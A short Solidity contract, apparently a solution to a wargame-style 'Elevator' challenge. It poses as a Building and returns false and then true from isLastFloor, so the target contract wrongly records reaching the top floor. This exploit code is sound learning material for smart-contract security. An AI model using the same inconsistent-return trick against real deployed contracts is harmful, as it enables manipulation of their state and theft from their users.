// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorHack is Building {

    bool called;
    Elevator target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external onlyTarget returns (bool)  {

        if (!called) { 

            called = true;

            return false;
        }

        return true;
    }

    function goTo() public {

        target.goTo(0);
    }

    modifier onlyTarget {

        require(msg.sender == address(target));
        _;
    }

}